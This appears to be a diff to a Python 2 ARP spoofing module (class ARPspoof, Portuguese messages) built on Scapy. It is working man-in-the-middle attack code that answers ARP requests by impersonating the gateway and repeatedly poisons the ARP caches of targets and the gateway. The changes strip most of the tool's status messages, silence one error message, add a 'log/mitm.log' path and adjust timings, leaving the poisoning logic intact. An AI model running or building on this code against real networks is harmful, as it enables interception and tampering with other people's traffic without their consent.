@@ -24,7 +24,6 @@ import threading
 from time import sleep
 from utils import *
 
-
 class ARPspoof(object):
 
 
@@ -47,7 +46,7 @@ class ARPspoof(object):
 		self.myip	= myip
 		self.mymac	= mymac
 		self.arp_cache	= {}
-
+		self.logfile	= "log/mitm.log"
 
 
 	def start(self):
@@ -116,7 +115,6 @@ class ARPspoof(object):
 				packet = None
 
 				if (str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and str(pkt[ARP].pdst) == self.gateway and self.myip != str(pkt[ARP].psrc)):
-					print '[ARPmon] {} está perguntando quem é o gateway. Enviando : "Eu sou o gateway!" como resposta'.format(pkt[ARP].psrc)
 					packet = ARP()
 					packet.op = 2
 					packet.psrc = self.gateway
@@ -124,7 +122,6 @@ class ARPspoof(object):
 					packet.pdst = str(pkt[ARP].psrc)
 
 				elif (str(pkt[ARP].hwsrc) == self.gateway_mac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip != str(pkt[ARP].pdst)):
-					print '[ARPmon] Gateway está perguntando onde {} está. Enviando: "Eu sou {} como resposta"'.format(pkt[ARP].pdst, pkt[ARP].pdst)
 					packet = ARP()
 					packet.op = 2
 					packet.psrc = self.gateway
@@ -132,7 +129,6 @@ class ARPspoof(object):
 					packet.pdst = str(pkt[ARP].pdst)
 
 				elif (str(pkt[ARP].hwsrc) == self.gateway_mac and str(pkt[ARP].hwdst) == '00:00:00:00:00:00' and self.myip == str(pkt[ARP].pdst)):
-					print "[ARPmon] Gateway está perguntando onde está {}. Enviando: 'Sou {}!'".format(pkt[ARP].pdst,pkt[ARP].pdst)
 					packet = ARP()
 					packet.op = 2
 					packet.psrc = self.myip
@@ -144,7 +140,6 @@ class ARPspoof(object):
 				except Exception as e:
 					if "Interrupted system call" not in e:
 						print "[ARPmon] Exceção ocorreu enquanto re-envenenava pacote: {}".format(e)
-
 
 
 	def resolve_target_mac(self, targetip):
@@ -165,9 +160,8 @@ class ARPspoof(object):
 			if len(resp) > 0:
 				targetmac = resp[0][1].hwsrc
 				self.arp_cache[targetip] = targetmac
-				print "[+] Resolvido {} --> {}".format(targetip, targetmac)
 			else:
-				print "[-] Não foi possivel resolver o endereço MAC de {}".format(targetip)
+				pass
 		return targetmac
 
 
@@ -191,21 +185,20 @@ class ARPspoof(object):
 						
 						if targetmac is not None:
 							try:
-								print "[+] Evenenando {} <--> {}".format(targetip, self.gateway)
 								self.socket2.send(Ether(src=self.mymac, dst=targetmac)/ARP(pdst=targetip, psrc=self.gateway, hwdst=targetmac, op=arpmode))
 								self.socket2.send(Ether(src=targetmac, dst=self.gateway_mac)/ARP(pdst=self.gateway, psrc=targetip, hwdst=self.gateway_mac, op=arpmode))
 						
 							except Exception as e:
 								if "Interrupted system call" not in e:
 									print "[!] Exceção ocorreu enquanto envenenava {}: {}".format(targetip, e)
-			sleep(self.interval)
+			sleep(self.interval)		
 
 
 
 	
 	def stop(self):
 		self.send = False
-		sleep(3)
+		sleep(2)
 		count = 2
 
 		if self.targets is None:
